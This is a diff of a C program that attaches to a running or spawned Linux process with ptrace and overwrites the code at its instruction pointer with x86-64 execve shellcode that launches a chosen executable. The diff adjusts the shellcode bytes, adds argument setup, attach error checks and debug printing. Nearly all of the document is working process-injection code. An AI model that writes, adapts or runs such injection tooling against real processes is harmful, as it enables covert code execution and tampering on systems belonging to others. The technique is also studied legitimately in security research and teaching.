@@ -25,21 +25,30 @@
  * SOFTWARE.
  */
 
-#define __OUTPUT__
+#define __OUTPUT__ // whether you want output
+#define __DEBUG__  // whether you want _more_ output
+
+#ifdef __DEBUG__
+#  ifndef __OUTPUT__
+#    define __OUTPUT__
+#  endif
+#  define DEBUG "\033[34m[+]\033[0m"
+#endif
 
 #ifdef __OUTPUT__
 #  include<stdio.h>
-#  define INFO "\033[34m[+]\033[0m"
-#  define HELP(X) printf("OPTIONS: %s [PID/PATH] [.BIN/EXECUTABLE]\n", X); exit(1);
+#  define INFO "\033[32m[-]\033[0m"
+#  define HELP(X) printf("OPTIONS: %s [PID/PATH] [EXECUTABLE]\n", X); exit(1);
 #endif
 
 #define __GNU_SOURCE
 
+#include<errno.h>
 #include<stdlib.h>
 #include<string.h>
 #include<sys/ptrace.h> /* ptrace() */
 #include<sys/reg.h> /* EIP, RIP */
-#include<sys/types.h> /* pid_t */
+#include<sys/types.h> /* pid_t, size_t */
 #include<sys/wait.h> /* waitpid() */
 #include<unistd.h>
 
@@ -54,8 +63,12 @@ static u_int8_t base_shellcode[] = {
   0x48, 0x31, 0xff,                         // xor rdi, rdi
   0x48, 0x31, 0xf6,                         // xor rsi, rsi
   0x48, 0x31, 0xd2,                         // xor rdx, rdx
-  0x48, 0x8d, 0x3d, 0x25, 0x10, 0x10, 0x10,	// lea rdi, [rip+0x10101025]
+  0x48, 0x8d, 0x3d, 0x37, 0x10, 0x10, 0x10,	// lea rdi, [rip+0x10101025]
   0x48, 0x81, 0xef, 0x10, 0x10, 0x10, 0x10,	// sub rdi, 0x10101010
+  0x48, 0x8d, 0x35, 0x29, 0x10, 0x10, 0x10, // lea rsi, [rip+0x10101029]
+  0x48, 0x81, 0xee, 0x10, 0x10, 0x10, 0x10, // sub rsi, 0x10101010
+  0x56,                                     // push rsi
+  0x48, 0x89, 0xe6,                         // mov rsi, rsp
   0xb0, 0x3b,                               // mov al, 59 ; execve()
   0x0f, 0x05,                               // syscall
   0x48, 0x31, 0xc0,                         // xor rax,rax
@@ -64,7 +77,8 @@ static u_int8_t base_shellcode[] = {
   0x0f, 0x05                                // syscall
 };
 
-//#elif defined(__i836) // amd32
+// X86
+//#elif defined(__i836)
 //#  define OFFSET -1
 //#  define IP_REG EIP
 //#  define PTR_T u_int32_t
@@ -92,12 +106,19 @@ u_int8_t child(char *pathname)
   exit(ret);
 }
 
-void attach(pid_t pid)
+int attach(pid_t pid)
 {
   int _;
-  ptrace(PTRACE_ATTACH, pid);
+  int ret = ptrace(PTRACE_ATTACH, pid);
+  if(ret != 0)
+  {
+    return ret;
+  }
+
   waitpid(pid, &_, 0);
   ptrace(PTRACE_SETOPTIONS, pid, 0, PTRACE_O_TRACEEXIT);
+
+  return 0;
 }
 
 PTR_T get_ip_reg(pid_t pid)
@@ -109,6 +130,7 @@ PTR_T get_ip_reg(pid_t pid)
 int main(int argc, char *argv[])
 {
 
+  int ret; // to be used again and again
   pid_t pid;
   char *pathname;
 
@@ -145,49 +167,84 @@ int main(int argc, char *argv[])
   }
 
   #ifdef __OUTPUT__
-    printf("%s Child PID: %i\n", INFO, pid);
+  printf("%s Child PID: %i\n", INFO, pid);
   #endif
 
-  attach(pid);
+  ret = attach(pid);
+  if (ret != 0)
+  {
+    #ifdef __OUTPUT__
+    printf("%s Failed to attach to process: %s\n", INFO, strerror(errno));
+    #endif
+
+    exit(1);
+  }
+  #ifdef __OUTPUT__
+  printf("%s Attached to process %i. Preparing shellcode.\n", INFO, pid);
+  #endif
 
   // appending `pathname` to shellcode
 
   size_t shellcode_size = strlen(base_shellcode) + strlen(pathname);
 
-  #ifdef __OUTPUT__
-  printf("%s Shellcode size: %i\n", INFO, shellcode_size);
+  #ifdef __DEBUG__
+  printf("%s Shellcode size: %i\n", DEBUG, shellcode_size);
   #endif
 
   u_int8_t shellcode[shellcode_size];
   strcpy(shellcode, base_shellcode);
   strcat(shellcode, pathname);
 
+  #ifdef __DEBUG__
+  printf("%s Shellcode: ", DEBUG);
+  for(int i = 0; i < shellcode_size; i++)
+  {
+    if(i % 10 == 0)
+    {
+      printf("\n");
+    }
+    printf("0x%02x ", shellcode[i]);
+  }
+  printf("\n");
+  #endif
+
   PTR_T ip = get_ip_reg(pid);
+
+  #ifdef __DEBUG__
+  printf("%s Instruction pointer (RIP/EIP): %p\n", DEBUG, ip);
+  #endif
+
+  #ifdef __OUTPUT__
+  printf("%s Injecting shellcode...\n", INFO);
+  #endif
 
   for(int i = 0; i < sizeof(shellcode); i++, ip++)
   {
-    #ifdef __OUTPUT__
-    printf("%s 0x%04x\t%c\t> %p\n", INFO, shellcode[i], shellcode[i], ip);
-    #endif
+    // too much output
+    //#ifdef __DEBUG__
+    //printf("%s 0x%02x  %c\t%p\n", DEBUG, shellcode[i], shellcode[i], ip);
+    //#endif
 
     ptrace(PTRACE_POKETEXT, pid, ip, shellcode[i]);
   }
 
+  #ifdef __OUTPUT__
+  printf("%s Shellcode injected. Restarting process.\n", INFO);
+  #endif
+
   ptrace(PTRACE_CONT, pid, 0, 0);
 
-  #ifdef __OUTPUT__
-
   int status;
-  waitpid(pid, &status, 0);
+  ret = waitpid(pid, &status, 0);
 
-  printf("%s Child status from waitpid: %i\n", INFO, status);
-  while(1)
+  #ifdef __OUTPUT__
+  if(ret < 0)
   {
-    if(WIFEXITED(status))
-    {
-      printf("Child exit status: %i\n", WEXITSTATUS(status));
-      exit(0);
-    }
+    printf("%s waitpid failed. Exiting...\n", INFO);
+  } else
+  if(ret == pid)
+  {
+    printf("%s Child exited. Exiting...\n", INFO);
   }
   #endif
 
